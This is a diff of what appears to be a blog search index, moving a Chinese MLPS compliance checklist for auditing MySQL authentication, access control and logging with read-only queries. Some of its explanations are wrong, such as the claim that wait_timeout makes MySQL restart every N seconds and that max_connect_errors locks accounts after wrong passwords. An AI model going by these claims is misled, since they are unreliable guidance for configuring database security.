         <tag>Windows</tag>
         <tag>内网渗透</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>等级保护-Mysql</title>
+    <url>/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4-Mysql/</url>
+    <content><![CDATA[<h1 id="身份鉴别"><a href="#身份鉴别" class="headerlink" title="身份鉴别"></a>身份鉴别</h1><h2 id="应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换"><a href="#应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换" class="headerlink" title="应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换"></a>应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换</h2><h3 id="使用如下命令查询账号"><a href="#使用如下命令查询账号" class="headerlink" title="使用如下命令查询账号:"></a>使用如下命令查询账号:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>, host,password <span class="keyword">from</span> mysql.user;</span><br><span class="line">#输出用户列表，查者是否存在相同用户名 </span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141618366.png" alt="image-20220714161800298"></p>
+<h3 id="执行如下语句查询是否在空口令用："><a href="#执行如下语句查询是否在空口令用：" class="headerlink" title="执行如下语句查询是否在空口令用："></a>执行如下语句查询是否在空口令用：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user <span class="keyword">where</span> length(password)<span class="operator">=</span> <span class="number">0</span> <span class="keyword">or</span> password <span class="keyword">is</span> <span class="keyword">null</span>;</span><br><span class="line"># 输出结果是否为空</span><br></pre></td></tr></table></figure>
+<p>MySQL身份鉴别通过username+host+password来进行登录验证，鉴别因素三者不能同时为空<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141618638.png" alt="image-20220714161824567"></p>
+<h3 id="查看用户口今复杂度相关配置"><a href="#查看用户口今复杂度相关配置" class="headerlink" title="查看用户口今复杂度相关配置:"></a>查看用户口今复杂度相关配置:</h3><p>针对5.6.6之后版本</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;validate_password%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">validate_password_check_user_name:OFF</span><br><span class="line">validate_password_dictionary_file: 字典文件</span><br><span class="line">validate_password_length:8 密码长度</span><br><span class="line">validate_password_mixed_case_count:1 大小写</span><br><span class="line">validate_password_number_count:1 密码中数据长度</span><br><span class="line">validate_password_policy:1 or MEDIUM</span><br><span class="line">validate_password_special_char_count:1 特殊字符</span><br></pre></td></tr></table></figure>
+<h3 id="定期更换"><a href="#定期更换" class="headerlink" title="定期更换"></a>定期更换</h3><p>MySQL5.6.6以后在user表中有一个password_last_changed字段，该字段默认为N修改为Y后可以通过定时器任务来进行密码修改。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> password_expired <span class="keyword">from</span> mysql.user;</span><br><span class="line">#该字段默认为N</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141618346.png" alt="image-20220714161856301"></p>
+<h2 id="应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"><a href="#应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施" class="headerlink" title="应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"></a>应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施</h2><h3 id="登录失败"><a href="#登录失败" class="headerlink" title="登录失败"></a>登录失败</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%max_connect_errors%&#x27;</span>;</span><br><span class="line"># max_connect_errors 是用户输入密码最大错误次数，失败达到最大次数则锁定</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141619065.png" alt="image-20220714161913016"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%timeout%&#x27;</span>;</span><br><span class="line"># 查看返回值Wait_timeout，这个参数是超时重连的时间，每过N秒MySQL就会重启</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141619238.png" alt="image-20220714161934175"></p>
+<h2 id="当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听"><a href="#当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听" class="headerlink" title="当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听"></a>当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听</h2><p>这个通过询问看看使用的远程链接方式是什么，查询此连接工具是否具备远程连接加密措施</p>
+<h2 id="应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现"><a href="#应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现" class="headerlink" title="应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现"></a>应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现</h2><p>询问并核查是否采用双因子登录数据库，且其中一种属于密码技术</p>
+<ul>
+<li>通常情况下都是用户名+口令，且数据库层面实现双因子登录比较困难</li>
+</ul>
+<h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="应对登录的用户分配账户和权限"><a href="#应对登录的用户分配账户和权限" class="headerlink" title="应对登录的用户分配账户和权限"></a>应对登录的用户分配账户和权限</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141620971.png" alt="image-20220714162005928"></p>
+<p>询问数据库管理员各个账户的作用与权限，输出结果是否与实际人员相符</p>
+<h2 id="应重命名或删除默认账户，修改默认账户的默认口令"><a href="#应重命名或删除默认账户，修改默认账户的默认口令" class="headerlink" title="应重命名或删除默认账户，修改默认账户的默认口令"></a>应重命名或删除默认账户，修改默认账户的默认口令</h2><p>查看默认用户是否重命名以及修改默认口令</p>
+<h2 id="应及时删除或停用多余的、过期的账户，避免共享账户的存在；"><a href="#应及时删除或停用多余的、过期的账户，避免共享账户的存在；" class="headerlink" title="应及时删除或停用多余的、过期的账户，避免共享账户的存在；"></a>应及时删除或停用多余的、过期的账户，避免共享账户的存在；</h2><p>查看user表再访谈管理员表中用户与现实是否做到一一对应，且无共用，多余，过期的账户</p>
+<h2 id="应授予管理用户所需的最小权限，实现管理用户的权限分离"><a href="#应授予管理用户所需的最小权限，实现管理用户的权限分离" class="headerlink" title="应授予管理用户所需的最小权限，实现管理用户的权限分离"></a>应授予管理用户所需的最小权限，实现管理用户的权限分离</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> Host,<span class="keyword">User</span>,File_priv,Shutdown_priv，grant_priv <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line">#</span><br><span class="line"> file_priv  加载服务器主机上的文件</span><br><span class="line"> grant_priv  数据库、表、存储过程或函数</span><br><span class="line"> shutdown_priv  关闭服务器</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+<p>查看各管理员账户权限设置是否与实际情况对应<br>注；此项至少要包括系统管理员和审计管理员才能算符合<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141620093.png" alt="image-20220714162029039"></p>
+<h2 id="应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"><a href="#应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则" class="headerlink" title="应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"></a>应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则</h2><ol>
+<li>登录不同的用户，验证是否存在越权访问的情形<br>注；通常情况下是由系统管理员来配置策略，基本上算默认符合</li>
+<li>访问控制策略<br> 询问输出的以下权限列是是否与管理员制定的访问控制策略及规则一致<br> <code>mysql&gt;select * from mysql.user\G </code><br> 检查用户权限列表<br> <img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621923.png" alt="image-20220714162104863"><br> <code>mysql&gt;select * from mysql.db\G</code><br> 检查数据库权限列表<br> <code>mysql&gt;select * from mysql.tables_priv\G</code><br> 检查用户表权限列表<br> <img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621679.png" alt="image-20220714162120630"></li>
+</ol>
+<h2 id="访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级"><a href="#访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级" class="headerlink" title="访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级"></a>访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级</h2><p>此项主要检查访问的主体和客体是什么级别的<br>注；通常情况下数据库层面主体为用户及，客体为数据库表级</p>
+<h2 id="应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问"><a href="#应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问" class="headerlink" title="应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问"></a>应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问</h2><h1 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h1><h2 id="应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计"><a href="#应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计" class="headerlink" title="应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计"></a>应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;log_%&#x27;</span>;</span><br><span class="line">查看二进制日志、慢查询日志、错误日志、操作日志是否开启</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;值为OFF或<span class="number">0</span>表示未开启</span><br><span class="line">核查是否采取第三方工具增强MySQL日志功能。</span><br><span class="line">若有，记录第三方审计工具的审计内容，</span><br><span class="line">查看是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621341.png" alt="image-20220714162143301"></p>
+<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621831.png" alt="image-20220714162157761"></p>
+<ul>
+<li><p><strong>二进制日志</strong><br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141622949.png" alt="image-20220714162220861"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_bin = LOG_NAME：         　　             （只读变量）只能通过修改配置文件来指定是否启用二进制日志（全局的）　　　　　#my.cnf配置文件中没有log_bin的配置，表示未开启二进制日志，如果存在log_bin的配置，则表示开启了二进制日志，同时，二进制日志文件的名称将会以log_bin对应的值为文件名前缀，文件默认位置在/var/lib/mysql/下，二进制日志文件的后缀名会进行自动编号，每次日志滚动后，后缀名编号自动加1.</span><br><span class="line">log_bin_basename = /var/lib/mysql/mysql-bin： 指定二进制日志的文件的基名</span><br><span class="line">log_bin_index = /var/lib/mysql/mysql-bin.index：指定二进制日志文件的索引文件</span><br><span class="line">binlog_format = STATEMENT|ROW|MIXED：      　 指定基于哪种方式进行记录　　　　　　　　　　STATEMENT:　　　　　　　　　  　基于“语句”记录　　　　　　　　　　ROW:　　　　　　　　　　　　   　基于“行”记录　　　　　　　　　　MIXED:　　　　　　　　　　　　　 让系统自行判定该基于哪种方式记录sync_binlog = 1|0：                           设定是否启动二进制日志同步功能</span><br><span class="line">             --&gt;每次提交事务，会将缓存中的内存刷新到二进制日志文件中。</span><br><span class="line">             --&gt;默认每个sql语句是一个事务，而且默认事务会自动提交，所以，默认的性能很差　　　　　　　　--&gt;此值为0时，表示当事务提交后，不会立即将内存中的binlog刷新到磁盘中；安全性最差，性能最高　　　　　　　　--&gt;此值为1时，表示每一次事务提交后，都会立即将内存中的二进制文件同步到磁盘中；安全性最高，性能最差　　　　　　　　--&gt;还能设置为N，当设置为3时，表示每3次事务提交后，将binlog从内存刷写到磁盘一次，值设置的越大，有可能丢失的日志数据越多，但性能会越好max_binlog_size = SIZE：                     指定二进制日志文件的上限，超过上限会滚动，以字节为单位（默认为1G，为1073741824B）</span><br><span class="line">max_binlog_cache_size = SIZE：               指定二进制日志缓存空间大小，空间被填满，会自动滚动</span><br><span class="line">sql_log_off = on|off：                       是否将一般的查询操作记录到二进制日志中</span><br><span class="line">sql_log_bin = ON |OFF：                     　指定是否启用二进制日志（会话级别）</span><br><span class="line">log_bin_trust_function_creators = on|off：  　指定是否允许创建可能导致不安全的函数</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>慢查询日志</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141622984.png" alt="image-20220714162252905"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 slow_query_log = OFF|ON  （0|1）　　　　　　#开启慢查询日志</span><br><span class="line">2 slow_query_log_file = LOCALHOST-SLOW.log #慢查询日志的文件路径</span><br><span class="line">3 long_query_time  　　　　　　　　　　　　　　 #慢查询时长；默认是10s</span><br><span class="line">4 log_slow_rate_limit　　　　　　　　　　　　　 #如果要记录的慢查询日志非常多的话，会按照速率来记录，默认1秒记录一个</span><br><span class="line">5 log_slow_verbosity=full | query_plan　　　 #记录的详细级别</span><br><span class="line">6 log_output 　　　　　　　　　　　　　　　　　　 #指定将记录到的查询保存到什么位置</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>错误日志</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%log_error%&#x27;</span>;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%log_warnings%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141623108.png" alt="image-20220714162314055"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 log_error = /var/log/mysql_error.log　　#指定错误日志的输出位置</span><br><span class="line">2 log_warnings 为0， 表示不记录告警信息。</span><br><span class="line">3 log_warnings 为1， 表示告警信息写入错误日志。</span><br><span class="line">4 log_warnings 大于1， 表示各类告警信息，例如有关网络故障的信息和重新连接信息写入错误日志。(默认为2)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>操作日志</strong></p>
+</li>
+</ul>
+<h2 id="审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"><a href="#审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息" class="headerlink" title="审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"></a>审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</h2><h3 id="执行下列语句"><a href="#执行下列语句" class="headerlink" title="执行下列语句:"></a>执行下列语句:</h3><p>mysql&gt;show master status;查看当前日志<br>根据日志存放路径，查看输出的日志内容</p>
+<h3 id="核查是否采取第三方工具增强MySQL日志功能。"><a href="#核查是否采取第三方工具增强MySQL日志功能。" class="headerlink" title="核查是否采取第三方工具增强MySQL日志功能。"></a>核查是否采取第三方工具增强MySQL日志功能。</h3><p>若有，记录第三方审计工具的审计内容，查看是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息<br>注；只要开启了审计功能，此项默认符合</p>
+<h2 id="应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等"><a href="#应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等" class="headerlink" title="应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等"></a>应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等</h2><p>询问管理员</p>
+<h2 id="应对审计进程进行保护，防止未经授权的中断"><a href="#应对审计进程进行保护，防止未经授权的中断" class="headerlink" title="应对审计进程进行保护，防止未经授权的中断"></a>应对审计进程进行保护，防止未经授权的中断</h2><p>切换开放状态的账户（非root账户）进行测试，看能否中断审计、日志服务：</p>
+]]></content>
+      <categories>
+        <category>等级保护</category>
+      </categories>
+      <tags>
+        <tag>Mysql</tag>
+        <tag>等级保护</tag>
       </tags>
   </entry>
   <entry>
@@ -336,73 +631,6 @@
       </categories>
       <tags>
         <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>等级保护-Mysql</title>
-    <url>/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4-Mysql/</url>
-    <content><![CDATA[<h1 id="身份鉴别"><a href="#身份鉴别" class="headerlink" title="身份鉴别"></a>身份鉴别</h1><h2 id="应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换"><a href="#应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换" class="headerlink" title="应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换"></a>应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换</h2><h3 id="使用如下命令查询账号"><a href="#使用如下命令查询账号" class="headerlink" title="使用如下命令查询账号:"></a>使用如下命令查询账号:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>, host,password <span class="keyword">from</span> mysql.user;</span><br><span class="line">#输出用户列表，查者是否存在相同用户名 </span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141618366.png" alt="image-20220714161800298"></p>
-<h3 id="执行如下语句查询是否在空口令用："><a href="#执行如下语句查询是否在空口令用：" class="headerlink" title="执行如下语句查询是否在空口令用："></a>执行如下语句查询是否在空口令用：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user <span class="keyword">where</span> length(password)<span class="operator">=</span> <span class="number">0</span> <span class="keyword">or</span> password <span class="keyword">is</span> <span class="keyword">null</span>;</span><br><span class="line"># 输出结果是否为空</span><br></pre></td></tr></table></figure>
-<p>MySQL身份鉴别通过username+host+password来进行登录验证，鉴别因素三者不能同时为空<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141618638.png" alt="image-20220714161824567"></p>
-<h3 id="查看用户口今复杂度相关配置"><a href="#查看用户口今复杂度相关配置" class="headerlink" title="查看用户口今复杂度相关配置:"></a>查看用户口今复杂度相关配置:</h3><p>针对5.6.6之后版本</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;validate_password%&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">validate_password_check_user_name:OFF</span><br><span class="line">validate_password_dictionary_file: 字典文件</span><br><span class="line">validate_password_length:8 密码长度</span><br><span class="line">validate_password_mixed_case_count:1 大小写</span><br><span class="line">validate_password_number_count:1 密码中数据长度</span><br><span class="line">validate_password_policy:1 or MEDIUM</span><br><span class="line">validate_password_special_char_count:1 特殊字符</span><br></pre></td></tr></table></figure>
-<h3 id="定期更换"><a href="#定期更换" class="headerlink" title="定期更换"></a>定期更换</h3><p>MySQL5.6.6以后在user表中有一个password_last_changed字段，该字段默认为N修改为Y后可以通过定时器任务来进行密码修改。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> password_expired <span class="keyword">from</span> mysql.user;</span><br><span class="line">#该字段默认为N</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141618346.png" alt="image-20220714161856301"></p>
-<h2 id="应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"><a href="#应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施" class="headerlink" title="应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"></a>应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施</h2><h3 id="登录失败"><a href="#登录失败" class="headerlink" title="登录失败"></a>登录失败</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%max_connect_errors%&#x27;</span>;</span><br><span class="line"># max_connect_errors 是用户输入密码最大错误次数，失败达到最大次数则锁定</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141619065.png" alt="image-20220714161913016"></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%timeout%&#x27;</span>;</span><br><span class="line"># 查看返回值Wait_timeout，这个参数是超时重连的时间，每过N秒MySQL就会重启</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141619238.png" alt="image-20220714161934175"></p>
-<h2 id="当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听"><a href="#当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听" class="headerlink" title="当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听"></a>当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听</h2><p>这个通过询问看看使用的远程链接方式是什么，查询此连接工具是否具备远程连接加密措施</p>
-<h2 id="应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现"><a href="#应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现" class="headerlink" title="应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现"></a>应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现</h2><p>询问并核查是否采用双因子登录数据库，且其中一种属于密码技术</p>
-<ul>
-<li>通常情况下都是用户名+口令，且数据库层面实现双因子登录比较困难</li>
-</ul>
-<h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="应对登录的用户分配账户和权限"><a href="#应对登录的用户分配账户和权限" class="headerlink" title="应对登录的用户分配账户和权限"></a>应对登录的用户分配账户和权限</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141620971.png" alt="image-20220714162005928"></p>
-<p>询问数据库管理员各个账户的作用与权限，输出结果是否与实际人员相符</p>
-<h2 id="应重命名或删除默认账户，修改默认账户的默认口令"><a href="#应重命名或删除默认账户，修改默认账户的默认口令" class="headerlink" title="应重命名或删除默认账户，修改默认账户的默认口令"></a>应重命名或删除默认账户，修改默认账户的默认口令</h2><p>查看默认用户是否重命名以及修改默认口令</p>
-<h2 id="应及时删除或停用多余的、过期的账户，避免共享账户的存在；"><a href="#应及时删除或停用多余的、过期的账户，避免共享账户的存在；" class="headerlink" title="应及时删除或停用多余的、过期的账户，避免共享账户的存在；"></a>应及时删除或停用多余的、过期的账户，避免共享账户的存在；</h2><p>查看user表再访谈管理员表中用户与现实是否做到一一对应，且无共用，多余，过期的账户</p>
-<h2 id="应授予管理用户所需的最小权限，实现管理用户的权限分离"><a href="#应授予管理用户所需的最小权限，实现管理用户的权限分离" class="headerlink" title="应授予管理用户所需的最小权限，实现管理用户的权限分离"></a>应授予管理用户所需的最小权限，实现管理用户的权限分离</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> Host,<span class="keyword">User</span>,File_priv,Shutdown_priv，grant_priv <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line">#</span><br><span class="line"> file_priv  加载服务器主机上的文件</span><br><span class="line"> grant_priv  数据库、表、存储过程或函数</span><br><span class="line"> shutdown_priv  关闭服务器</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
-<p>查看各管理员账户权限设置是否与实际情况对应<br>注；此项至少要包括系统管理员和审计管理员才能算符合<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141620093.png" alt="image-20220714162029039"></p>
-<h2 id="应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"><a href="#应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则" class="headerlink" title="应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"></a>应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则</h2><ol>
-<li>登录不同的用户，验证是否存在越权访问的情形<br>注；通常情况下是由系统管理员来配置策略，基本上算默认符合</li>
-<li>访问控制策略<br> 询问输出的以下权限列是是否与管理员制定的访问控制策略及规则一致<br> <code>mysql&gt;select * from mysql.user\G </code><br> 检查用户权限列表<br> <img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621923.png" alt="image-20220714162104863"><br> <code>mysql&gt;select * from mysql.db\G</code><br> 检查数据库权限列表<br> <code>mysql&gt;select * from mysql.tables_priv\G</code><br> 检查用户表权限列表<br> <img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621679.png" alt="image-20220714162120630"></li>
-</ol>
-<h2 id="访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级"><a href="#访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级" class="headerlink" title="访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级"></a>访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级</h2><p>此项主要检查访问的主体和客体是什么级别的<br>注；通常情况下数据库层面主体为用户及，客体为数据库表级</p>
-<h2 id="应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问"><a href="#应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问" class="headerlink" title="应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问"></a>应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问</h2><h1 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h1><h2 id="应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计"><a href="#应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计" class="headerlink" title="应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计"></a>应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;log_%&#x27;</span>;</span><br><span class="line">查看二进制日志、慢查询日志、错误日志、操作日志是否开启</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;值为OFF或<span class="number">0</span>表示未开启</span><br><span class="line">核查是否采取第三方工具增强MySQL日志功能。</span><br><span class="line">若有，记录第三方审计工具的审计内容，</span><br><span class="line">查看是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621341.png" alt="image-20220714162143301"></p>
-<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621831.png" alt="image-20220714162157761"></p>
-<ul>
-<li><p><strong>二进制日志</strong><br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141622949.png" alt="image-20220714162220861"></p>
